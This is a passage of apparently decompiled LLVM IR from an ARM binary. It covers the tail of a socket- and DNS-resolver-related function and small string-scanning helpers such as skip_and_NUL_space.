  br i1 %v1_1fdd8, label %dec_label_pc_1fde0, label %dec_label_pc_1fdfc

dec_label_pc_1fde0:                               ; preds = %dec_label_pc_1fdd8, %dec_label_pc_1fd38, %dec_label_pc_1fcf4, %dec_label_pc_1fdd8.thread
  store i32 %stack_var_-452.062, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1fde4 = icmp eq i32 %stack_var_-452.062, 0
  br i1 %v2_1fde4, label %dec_label_pc_1ff58, label %dec_label_pc_1fdec

dec_label_pc_1fdec:                               ; preds = %dec_label_pc_1fde0
  store i32 %tmp148, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1fdf0, label %dec_label_pc_1ff58, label %dec_label_pc_1ff30

dec_label_pc_1fdfc:                               ; preds = %dec_label_pc_1fdd8
  store i32 %stack_var_-480.261, i32* @ip, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1fe00 = icmp eq i32 %stack_var_-480.261, 0
  br i1 %v2_1fe00, label %dec_label_pc_1feb0, label %dec_label_pc_1fe08

dec_label_pc_1fe08:                               ; preds = %dec_label_pc_1fdfc
  %v0_1fe08 = load i32, i32* @sb, align 4
  %v1_1fe08 = add i32 %v0_1fe08, 28
  %v2_1fe08 = inttoptr i32 %v1_1fe08 to i32*
  %v3_1fe08 = load i32, i32* %v2_1fe08, align 4
  store i32 %v3_1fe08, i32* @r3, align 4
  %v1_1fe0c = add i32 %v0_1fe08, 32
  %v2_1fe0c = inttoptr i32 %v1_1fe0c to i32*
  %v3_1fe0c = load i32, i32* %v2_1fe0c, align 4
  store i32 %v3_1fe0c, i32* %r2.global-to-local, align 4
  %v1_1fe10 = add i32 %v0_1fe08, 36
  %v2_1fe10 = inttoptr i32 %v1_1fe10 to i32*
  %v3_1fe10 = load i32, i32* %v2_1fe10, align 4
  store i32 %v3_1fe10, i32* %r1.global-to-local, align 4
  %v1_1fe14 = inttoptr i32 %v0_1fe08 to i32*
  %v2_1fe14 = load i32, i32* %v1_1fe14, align 4
  store i32 %v2_1fe14, i32* @r0, align 4
  %v0_1fe24 = call i32 @free()
  store i32 40, i32* @r2, align 4
  %v0_1fe2c = load i32, i32* @sb, align 4
  store i32 %v0_1fe2c, i32* @r0, align 4
  store i32 %v2_1fcd8, i32* @r1, align 4
  %v0_1fe34 = call i32 @memcpy()
  %v0_1fe38 = load i32, i32* @sb, align 4
  %v1_1fe38 = add i32 %v0_1fe38, 4
  %v2_1fe38 = inttoptr i32 %v1_1fe38 to i32*
  %v3_1fe38 = load i32, i32* %v2_1fe38, align 4
  store i32 %v3_1fe38, i32* %r2.global-to-local, align 4
  %v2_1fe3c = icmp ugt i32 %v3_1fe38, 23
  store i1 %v2_1fe3c, i1* %cpsr_c.global-to-local, align 1
  %v7_1fe3c = icmp eq i32 %v3_1fe38, 24
  br i1 %v7_1fe3c, label %dec_label_pc_1fe60, label %dec_label_pc_1fe44

dec_label_pc_1fe44:                               ; preds = %dec_label_pc_1fe08
  %v1_1fe44 = add i32 %v0_1fe38, 28
  %v2_1fe44 = inttoptr i32 %v1_1fe44 to i32*
  %v3_1fe44 = load i32, i32* %v2_1fe44, align 4
  store i32 %v3_1fe44, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1fe48 = icmp eq i32 %v3_1fe44, 0
  br i1 %v2_1fe48, label %dec_label_pc_1ff30, label %dec_label_pc_1fe50

dec_label_pc_1fe50:                               ; preds = %dec_label_pc_1fe44
  store i1 %v2_1fe54, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1fe54, label %dec_label_pc_1fe60, label %bb231

bb231:                                            ; preds = %dec_label_pc_1fe50
  store i1 %v3_1fe58, i1* %cpsr_c.global-to-local, align 1
  br i1 %v8_1fe58, label %dec_label_pc_1fe60, label %dec_label_pc_1ff30

dec_label_pc_1fe60:                               ; preds = %dec_label_pc_1fe50, %bb231, %dec_label_pc_1fe08
  store i32 %v0_1f824, i32* %r1.global-to-local, align 4
  %v3_1fe64 = icmp uge i32 %v3_1fe38, %v0_1f824
  store i1 %v3_1fe64, i1* %cpsr_c.global-to-local, align 1
  %v9_1fe64 = icmp eq i32 %v3_1fe38, %v0_1f824
  br i1 %v9_1fe64, label %dec_label_pc_1fe74, label %bb232

bb232:                                            ; preds = %dec_label_pc_1fe60
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ff08

dec_label_pc_1fe74:                               ; preds = %dec_label_pc_1fe60
  store i32 %tmp163, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-452.062, i32* @r5, align 4
  %v1_1fe7c = add i32 %v0_1fe38, 16
  %v2_1fe7c = inttoptr i32 %v1_1fe7c to i32*
  %v3_1fe7c = load i32, i32* %v2_1fe7c, align 4
  %v2_1fe80 = sub i32 %tmp163, %stack_var_-452.062
  %v1_1fe84 = add i32 %v2_1fe80, -1
  store i32 %v1_1fe84, i32* %r3.global-to-local, align 4
  %v1_1fe88 = add i32 %v3_1fe7c, 4
  store i32 %v1_1fe88, i32* %r2.global-to-local, align 4
  %v2_1fe8c = mul i32 %v1_1fe88, %v1_1fe84
  store i32 %v2_1fe8c, i32* @r1, align 4
  %v1_1fe90 = add i32 %v0_1fe38, 32
  %v2_1fe90 = inttoptr i32 %v1_1fe90 to i32*
  %v3_1fe90 = load i32, i32* %v2_1fe90, align 4
  store i32 %v3_1fe90, i32* %r2.global-to-local, align 4
  %v3_1fe94 = icmp uge i32 %v2_1fe8c, %v3_1fe90
  store i1 %v3_1fe94, i1* %cpsr_c.global-to-local, align 1
  %v2_1fe98 = add i32 %v0_1fe38, 36
  %v3_1fe98 = inttoptr i32 %v2_1fe98 to i32*
  store i32 %v1_1fe84, i32* %v3_1fe98, align 4
  %tmp289 = icmp ugt i32 %v2_1fe8c, %v3_1fe90
  br i1 %tmp289, label %dec_label_pc_1ff30, label %dec_label_pc_1fea0

dec_label_pc_1fea0:                               ; preds = %dec_label_pc_1fe74
  store i32 0, i32* @r7, align 4
  %v1_1fea8 = load i32, i32* @sb, align 4
  %v2_1fea8 = add i32 %v1_1fea8, 36
  %v3_1fea8 = inttoptr i32 %v2_1fea8 to i32*
  store i32 0, i32* %v3_1fea8, align 4
  br label %dec_label_pc_1ff08

dec_label_pc_1feb0:                               ; preds = %dec_label_pc_1fdfc
  store i32 %v2_1fd3c, i32* @r0, align 4
  %v0_1feb4 = call i32 @free()
  store i32 %v5_1fd90, i32* %r3.global-to-local, align 4
  store i32 %v0_1f824, i32* @ip, align 4
  %v3_1fec0 = icmp uge i32 %v5_1fd90, %v0_1f824
  store i1 %v3_1fec0, i1* %cpsr_c.global-to-local, align 1
  %v9_1fec0 = icmp eq i32 %v5_1fd90, %v0_1f824
  br i1 %v9_1fec0, label %dec_label_pc_1fec8, label %dec_label_pc_1ff08

dec_label_pc_1fec8:                               ; preds = %dec_label_pc_1feb0
  %v0_1fec8 = load i32, i32* @sb, align 4
  %v1_1fec8 = add i32 %v0_1fec8, 16
  %v2_1fec8 = inttoptr i32 %v1_1fec8 to i32*
  %v3_1fec8 = load i32, i32* %v2_1fec8, align 4
  store i32 %v3_1fec8, i32* %r1.global-to-local, align 4
  store i32 %v5_1fd88, i32* %r3.global-to-local, align 4
  %v3_1fed0 = icmp uge i32 %v3_1fec8, %v5_1fd88
  store i1 %v3_1fed0, i1* %cpsr_c.global-to-local, align 1
  %v9_1fed0 = icmp eq i32 %v3_1fec8, %v5_1fd88
  br i1 %v9_1fed0, label %dec_label_pc_1fee4, label %dec_label_pc_1fed8

dec_label_pc_1fed8:                               ; preds = %dec_label_pc_1fec8
  %v1_1fed8 = inttoptr i32 %v0_1fec8 to i32*
  %v2_1fed8 = load i32, i32* %v1_1fed8, align 4
  store i32 %v2_1fed8, i32* @r0, align 4
  %v0_1fedc = call i32 @free()
  br label %dec_label_pc_1ff58

dec_label_pc_1fee4:                               ; preds = %dec_label_pc_1fec8
  %v1_1fee4 = add i32 %v0_1fec8, 36
  %v2_1fee4 = inttoptr i32 %v1_1fee4 to i32*
  %v3_1fee4 = load i32, i32* %v2_1fee4, align 4
  store i32 %v3_1fee4, i32* %r2.global-to-local, align 4
  %v1_1fee8 = add i32 %v0_1fec8, 28
  %v2_1fee8 = inttoptr i32 %v1_1fee8 to i32*
  %v3_1fee8 = load i32, i32* %v2_1fee8, align 4
  store i32 %v3_1fee8, i32* @r3, align 4
  %v3_1feec = mul i32 %v3_1fee4, %v5_1fd88
  %v4_1feec = add i32 %v3_1fee8, %v3_1feec
  store i32 %v4_1feec, i32* @r0, align 4
  store i32 %v5_1fd88, i32* @r2, align 4
  store i32 %v1_1fda8, i32* @r1, align 4
  %v0_1fef8 = call i32 @memcpy()
  %v0_1fefc = load i32, i32* @sb, align 4
  %v1_1fefc = add i32 %v0_1fefc, 36
  %v2_1fefc = inttoptr i32 %v1_1fefc to i32*
  %v3_1fefc = load i32, i32* %v2_1fefc, align 4
  %v1_1ff00 = add i32 %v3_1fefc, 1
  store i32 %v1_1ff00, i32* %r3.global-to-local, align 4
  store i32 %v1_1ff00, i32* %v2_1fefc, align 4
  br label %dec_label_pc_1ff08

dec_label_pc_1ff08:                               ; preds = %bb232, %dec_label_pc_1feb0, %dec_label_pc_1fea0, %dec_label_pc_1fee4
  %stack_var_-480.1 = phi i32 [ 0, %dec_label_pc_1fee4 ], [ 0, %dec_label_pc_1feb0 ], [ 0, %dec_label_pc_1fea0 ], [ 1, %bb232 ]
  %v1_1ff10 = load i32, i32* @r4, align 4
  %v2_1ff10 = add i32 %v1_1ff10, %stack_var_-460.365
  %v1_1ff14 = add nuw nsw i32 %stack_var_-452.062, 1
  store i32 %v1_1ff14, i32* @r1, align 4
  store i32 %tmp163, i32* %r3.global-to-local, align 4
  store i32 %v1_1ff14, i32* %r2.global-to-local, align 4
  %v3_1ff28 = icmp uge i32 %v1_1ff14, %tmp163
  store i1 %v3_1ff28, i1* %cpsr_c.global-to-local, align 1
  %v5_1ff2c = icmp slt i32 %v1_1ff14, %tmp163
  br i1 %v5_1ff2c, label %dec_label_pc_1fcf4, label %dec_label_pc_1ff30

dec_label_pc_1ff30:                               ; preds = %dec_label_pc_1fdec, %dec_label_pc_1fccc, %dec_label_pc_1ff08, %dec_label_pc_1fe44, %dec_label_pc_1fe74, %bb231
  %v1_1ff34 = call i32 @__GI___libc_close(i32 %v3_1fae8)
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1ff3c = icmp eq i32 %arg3, 0
  br i1 %v2_1ff3c, label %.thread22, label %bb234

bb234:                                            ; preds = %dec_label_pc_1ff30
  %v1_1ff44 = load i32, i32* @sl, align 4
  %v3_1ff40 = inttoptr i32 %arg3 to i32*
  store i32 %v1_1ff44, i32* %v3_1ff40, align 4
  br label %bb235

.thread22:                                        ; preds = %dec_label_pc_1ff30
  br label %bb235

bb235:                                            ; preds = %bb234, %.thread22
  store i32 ptrtoint (i32* @global_var_1ff4c.1840 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1ff3c, i32 ptrtoint (i32* @global_var_17778.1695 to i32))
  store i32 %v1_1f86c, i32* @r0, align 4
  %v0_1ff50 = call i32 @free()
  br label %dec_label_pc_1ffc8

dec_label_pc_1ff58:                               ; preds = %thread-pre-split, %dec_label_pc_1fb34, %dec_label_pc_1fca4, %dec_label_pc_1fc9c, %dec_label_pc_1fc4c, %dec_label_pc_1fc58, %dec_label_pc_1fc64thread-pre-split, %thread-pre-split.thread, %dec_label_pc_1fc14, %dec_label_pc_1fdec, %dec_label_pc_1fde0, %dec_label_pc_1faf8, %dec_label_pc_1fad8, %dec_label_pc_1fed8
  %v1_1ff5c = add i32 %v0_1f9fc, 1
  store i32 %v1_1ff5c, i32* @r5, align 4
  br label %dec_label_pc_1ff68

dec_label_pc_1ff68:                               ; preds = %.thread8, %dec_label_pc_1ff58
  %storemerge23 = phi i32 [ -1, %dec_label_pc_1ff58 ], [ %v7_1fbf8, %.thread8 ]
  %stack_var_-468.2 = phi i32 [ %v1_1ff5c, %dec_label_pc_1ff58 ], [ %v0_1f9fc, %.thread8 ]
  store i32 %storemerge23, i32* @r7, align 4
  %v1_1ff6c = add i32 %stack_var_-476.1, -1
  store i32 %v1_1ff6c, i32* @ip, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp236 = icmp slt i32 %v1_1ff6c, 1
  br i1 %tmp236, label %dec_label_pc_1ff88, label %dec_label_pc_1f908

dec_label_pc_1ff80:                               ; preds = %dec_label_pc_1faac, %bb222, %bb217, %.thread6, %dec_label_pc_1f888
  br label %dec_label_pc_1ff88

dec_label_pc_1ff88:                               ; preds = %dec_label_pc_1ff68, %.thread134, %dec_label_pc_1ff80
  %stack_var_-488.2 = phi i32 [ -1, %dec_label_pc_1ff80 ], [ -1, %.thread134 ], [ %v3_1fae8, %dec_label_pc_1ff68 ]
  %stack_var_-472.1 = phi i32 [ %v1_1f86c, %dec_label_pc_1ff80 ], [ 0, %.thread134 ], [ %v1_1f86c, %dec_label_pc_1ff68 ]
  store i32 ptrtoint (i32* @global_var_120a8.1842 to i32), i32* %r2.global-to-local, align 4
  store i32 %stack_var_-488.2, i32* @r1, align 4
  %v0_1ff90 = call i32 @__aeabi_read_tp()
  %v3_1ff94 = load i32, i32* @global_var_32044.1421, align 4
  store i32 %v3_1ff94, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1ff9c = load i32, i32* @r1, align 4
  %v2_1ff9c = icmp eq i32 %v0_1ff9c, -1
  store i1 %v2_1ff9c, i1* %cpsr_c.global-to-local, align 1
  %v7_1ff9c = icmp eq i32 %v0_1ff9c, -1
  %v3_1ffa0 = add i32 %v3_1ff94, %v0_1ff90
  %v4_1ffa0 = inttoptr i32 %v3_1ffa0 to i32*
  store i32 -1, i32* %v4_1ffa0, align 4
  br i1 %v7_1ff9c, label %dec_label_pc_1ffb0, label %dec_label_pc_1ffa8

dec_label_pc_1ffa8:                               ; preds = %dec_label_pc_1ff88, %dec_label_pc_1fc44
  %stack_var_-488.3 = phi i32 [ %stack_var_-488.2, %dec_label_pc_1ff88 ], [ %v3_1fae8, %dec_label_pc_1fc44 ]
  %stack_var_-472.2 = phi i32 [ %stack_var_-472.1, %dec_label_pc_1ff88 ], [ %v1_1f86c, %dec_label_pc_1fc44 ]
  %v1_1ffac = call i32 @__GI___libc_close(i32 %stack_var_-488.3)
  br label %dec_label_pc_1ffb0

dec_label_pc_1ffb0:                               ; preds = %dec_label_pc_1ff88, %dec_label_pc_1ffa8
  %stack_var_-472.3 = phi i32 [ %stack_var_-472.1, %dec_label_pc_1ff88 ], [ %stack_var_-472.2, %dec_label_pc_1ffa8 ]
  store i32 %stack_var_-472.3, i32* @r0, align 4
  %v0_1ffb4 = call i32 @free()
  %v0_1ffb8 = load i32, i32* @sl, align 4
  store i32 %v0_1ffb8, i32* @r0, align 4
  %v0_1ffbc = call i32 @free()
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ffc8

dec_label_pc_1ffc8:                               ; preds = %bb235, %dec_label_pc_1ffb0
  %stack_var_-484.0 = phi i32 [ -1, %dec_label_pc_1ffb0 ], [ %v5_1fb70, %bb235 ]
  store i32 %v3_1f810, i32* @r4, align 4
  store i32 %v6_1f810, i32* @r5, align 4
  store i32 %v9_1f810, i32* @r6, align 4
  store i32 %v12_1f810, i32* @r7, align 4
  store i32 %v15_1f810, i32* @r8, align 4
  store i32 %v18_1f810, i32* @sb, align 4
  store i32 %v21_1f810, i32* @sl, align 4
  store i32 %v24_1f810, i32* @fp, align 4
  store i32 %v27_1f810, i32* @lr, align 4
  ret i32 %stack_var_-484.0

; uselistorder directives
  uselistorder i32 %stack_var_-472.1, { 1, 0 }
  uselistorder i32 %v1_1ff6c, { 1, 2, 0 }
  uselistorder i32 %v1_1ff14, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_1fec8, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1fe84, { 1, 0, 2 }
  uselistorder i32 %v0_1fe08, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1fdb0, { 1, 0 }
  uselistorder i32 %v5_1fd88, { 5, 0, 2, 3, 4, 1, 7, 6, 8 }
  uselistorder i32 %v2_1fd48, { 4, 5, 0, 6, 7, 1, 2, 3, 8, 9, 10, 11 }
  uselistorder i32 %v2_1fd44, { 1, 0 }
  uselistorder i32 %v2_1fd28, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32 %v2_1fd24, { 1, 0 }
  uselistorder i32 %v1_1fd20, { 1, 0, 2 }
  uselistorder i32 %stack_var_-452.062, { 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-460.365, { 0, 1, 4, 2, 3 }
  uselistorder i32 %v0_1fc9c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_1fc78, { 1, 0 }
  uselistorder i32 %v3_1fc6c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1fc6c, { 0, 2, 1 }
  uselistorder i32 %v2_1fc60, { 0, 2, 1 }
  uselistorder i1 %v7_1fb80, { 1, 0 }
  uselistorder i32 %v1_1fb80, { 1, 0 }
  uselistorder i32 %v0_1fb80, { 1, 0 }
  uselistorder i32 %v5_1fb70, { 1, 2, 4, 3, 0, 5, 6, 7 }
  uselistorder i32 %v0_1fb44, { 1, 0 }
  uselistorder i32 %v3_1fae8, { 1, 0, 2, 6, 7, 5, 4, 8, 9, 10, 3 }
  uselistorder i32 %v6_1faa0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1fa2c, { 0, 1, 5, 4, 3, 2 }
  uselistorder i32 %v3_1fa14, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 %v1_1fa08, { 1, 0 }
  uselistorder i32 %v0_1f9fc, { 4, 3, 1, 2, 0 }
  uselistorder i32 %v0_1f9b4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1f920, { 1, 0, 2 }
  uselistorder i1 %v7_1f90c, { 1, 0 }
  uselistorder i32 %v1_1f910, { 0, 2, 1 }
  uselistorder i32 %v2_1fcd4, { 1, 0 }
  uselistorder i32 %v1_1fbd4, { 2, 0, 1 }
  uselistorder i32 %v2_1fa5c, { 1, 0, 2 }
  uselistorder i32 %v2_1fa34, { 1, 0 }
  uselistorder i32 %v0_1f888, { 1, 0, 2 }
  uselistorder i32 %v1_1f86c, { 5, 0, 2, 4, 3, 6, 7, 1, 8, 9 }
  uselistorder i32 %v3_1f838, { 6, 1, 3, 2, 4, 5, 0, 7 }
  uselistorder i32 %v0_1f824, { 9, 8, 7, 6, 5, 4, 10, 0, 1, 3, 2 }
  uselistorder i16* %stack_var_-104, { 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 2, 0, 3, 1, 4 }
  uselistorder i32 %tmp164, { 1, 0, 2 }
  uselistorder i32 %tmp163, { 8, 7, 6, 0, 5, 2, 3, 1, 4 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 17, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 36, 18, 19, 35, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 1, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 14, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 24, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 7, 2, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 23, 19, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 23, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 0, 24, 25, 26, 27, 28, 3, 29, 30, 31, 32, 33, 34, 35, 36, 37, 1, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32 (i32)* @__GI___libc_close, { 13, 12, 14, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 23, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__decode_dotted, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_recv, { 1, 4, 3, 2, 0 }
  uselistorder i32 1000, { 3, 2, 4, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 1, 6, 5, 11, 10, 9, 8, 7, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 0, 8, 7, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 (i32, i32, i32)* @socket, { 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 17, { 1, 10, 2, 11, 0, 9, 12, 3, 4, 6, 5, 7, 8 }
  uselistorder i32 124, { 1, 3, 4, 5, 6, 7, 8, 2, 9, 0, 10 }
  uselistorder i32 27, { 1, 0, 2 }
  uselistorder i8 46, { 3, 2, 0, 4, 1, 5 }
  uselistorder i8 45, { 3, 1, 4, 2, 0, 5, 6, 7 }
  uselistorder i32 29092, { 1, 0, 2, 3 }
  uselistorder i32 130, { 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1ffc8, { 1, 0 }
  uselistorder label %dec_label_pc_1ffb0, { 1, 0 }
  uselistorder label %dec_label_pc_1ff88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1ff80, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_1ff68, { 1, 0 }
  uselistorder label %dec_label_pc_1ff58, { 13, 9, 10, 2, 3, 6, 5, 4, 8, 0, 7, 1, 11, 12 }
  uselistorder label %bb235, { 1, 0 }
  uselistorder label %dec_label_pc_1ff30, { 2, 4, 5, 3, 0, 1 }
  uselistorder label %dec_label_pc_1ff08, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1fe60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1fde0, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1fcf4, { 1, 0 }
  uselistorder label %dec_label_pc_1fc9c, { 1, 0 }
  uselistorder label %dec_label_pc_1fc6c, { 1, 0 }
  uselistorder label %dec_label_pc_1fc44, { 1, 0 }
  uselistorder label %dec_label_pc_1fb80, { 1, 0, 2 }
  uselistorder label %bb222, { 1, 0 }
  uselistorder label %dec_label_pc_1f9dc, { 1, 0 }
  uselistorder label %dec_label_pc_1f9a0, { 1, 0 }
  uselistorder label %bb220, { 1, 0 }
}

define i32 @"$d"(i64* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1ffd8:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_1ffd8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1ffd8, label %bb, label %.thread13

bb:                                               ; preds = %dec_label_pc_1ffd8
  %tmp17 = inttoptr i32 %arg2 to i64*
  %v4_1ffdc = load i64, i64* %tmp17, align 4
  %v6_1ffdc = trunc i64 %v4_1ffdc to i32
  %v7_1ffdc = udiv i64 %v4_1ffdc, 4294967296
  %v2_1ffe0 = load i32, i32* @ip, align 4
  %v2_1ffec = load i32, i32* @r4, align 4
  %v9_1fff4 = sub i32 0, %v2_1ffe0
  %v5_1fff8 = mul i32 %v2_1ffe0, -512
  %v5_20000 = mul i32 %v6_1ffdc, 512
  %v6_1fff8 = and i32 %v5_20000, %v9_1fff4
  %v6_20000 = and i32 %v6_1fff8, %v5_1fff8
  %v5_2001015 = mul nuw nsw i64 %v7_1ffdc, 512
  %v5_20010 = trunc i64 %v5_2001015 to i32
  %v9_2000c = and i32 %v2_1ffec, %v5_20010
  %v6_20010 = and i32 %v9_2000c, %v6_20000
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_1ffd8, %bb
  %v7_20010 = phi i32 [ %tmp, %dec_label_pc_1ffd8 ], [ %v6_20010, %bb ]
  ret i32 %v7_20010

; uselistorder directives
  uselistorder i32 512, { 0, 4, 7, 8, 3, 9, 5, 10, 2, 11, 12, 13, 14, 6, 1 }
  uselistorder label %.thread13, { 1, 0 }
}

define i32 @skip_nospace() local_unnamed_addr {
entry:
  store i32 636, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @ip, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @skip_and_NUL_space(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_20078 = load i32, i32* @r4, align 4
  store i32 %v3_20078, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %ip.global-to-local, align 4
  store i32 636, i32* %r4.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_20088.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_200889 = inttoptr i32 %v0_20088.pre to i8*
  %v2_2008810 = load i8, i8* %v1_200889, align 1
  %v2_2008c12 = icmp eq i8 %v2_2008810, 0
  store i1 %v2_2008c12, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2008c12, label %dec_label_pc_200bc, label %dec_label_pc_20098

dec_label_pc_20098:                               ; preds = %entry, %bb8.dec_label_pc_20098_crit_edge
  %v1_20098 = phi i32 [ %v1_20098.pre, %bb8.dec_label_pc_20098_crit_edge ], [ 636, %entry ]
  %v0_20098 = phi i32 [ %v0_20098.pre, %bb8.dec_label_pc_20098_crit_edge ], [ ptrtoint (i32* @global_var_32024.1324 to i32), %entry ]
  %v2_2008816 = phi i8 [ %v2_20088, %bb8.dec_label_pc_20098_crit_edge ], [ %v2_2008810, %entry ]
  %v2_2009017.in.in = phi i8 [ %v2_20088, %bb8.dec_label_pc_20098_crit_edge ], [ %v2_2008810, %entry ]
  %v1_2008815 = phi i8* [ %v1_20088, %bb8.dec_label_pc_20098_crit_edge ], [ %v1_200889, %entry ]
  %v2_200b014 = phi i32 [ %v2_200b4, %bb8.dec_label_pc_20098_crit_edge ], [ %v0_20088.pre, %entry ]
  %v2_2009017.in = zext i8 %v2_2009017.in.in to i32
  %v2_2009017 = mul nuw nsw i32 %v2_2009017.in, 2
  %v2_20098 = add i32 %v1_20098, %v0_20098
  %v3_20098 = inttoptr i32 %v2_20098 to i32*
  %v4_20098 = load i32, i32* %v3_20098, align 4
  %v2_2009c = add i32 %v4_20098, %v2_2009017
  %v3_2009c = inttoptr i32 %v2_2009c to i16*
  %v4_2009c = load i16, i16* %v3_2009c, align 2
  %v1_200a0 = and i16 %v4_2009c, 32
  %v2_200a0 = icmp eq i16 %v1_200a0, 0
  store i1 %v2_200a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_200a0, label %dec_label_pc_200bc, label %dec_label_pc_200a8

dec_label_pc_200a8:                               ; preds = %dec_label_pc_20098
  %v7_200a8 = icmp eq i8 %v2_2008816, 35
  br i1 %v7_200a8, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_200a8
  %v8_200ac = icmp eq i8 %v2_2008816, 10
  br label %bb7

bb7:                                              ; preds = %dec_label_pc_200a8, %bb
  %storemerge = phi i1 [ %v8_200ac, %bb ], [ %v7_200a8, %dec_label_pc_200a8 ]
  store i1 %storemerge, i1* %cpsr_z.global-to-local, align 1
  %v0_200b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_200b0 = trunc i32 %v0_200b0 to i8
  store i8 %v1_200b0, i8* %v1_2008815, align 1
  %v0_200b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_200c0.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_200b4, label %dec_label_pc_200bc, label %bb8

bb8:                                              ; preds = %bb7
  %v2_200b4 = add i32 %v1_200c0.pre, 1
  store i32 %v2_200b4, i32* %r0.global-to-local, align 4
  %v1_20088 = inttoptr i32 %v2_200b4 to i8*
  %v2_20088 = load i8, i8* %v1_20088, align 1
  %v2_2008c = icmp eq i8 %v2_20088, 0
  store i1 %v2_2008c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2008c, label %dec_label_pc_200bc, label %bb8.dec_label_pc_20098_crit_edge

bb8.dec_label_pc_20098_crit_edge:                 ; preds = %bb8
  %v0_20098.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_20098.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_20098

dec_label_pc_200bc:                               ; preds = %bb8, %dec_label_pc_20098, %bb7, %entry
  %v1_200c0 = phi i32 [ %v0_20088.pre, %entry ], [ %v1_200c0.pre, %bb7 ], [ %v2_200b014, %dec_label_pc_20098 ], [ %v2_200b4, %bb8 ]
  %v2_200bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_200bc, i32* @r4, align 4
  ret i32 %v1_200c0

; uselistorder directives
  uselistorder i8 %v2_20088, { 2, 1, 0 }
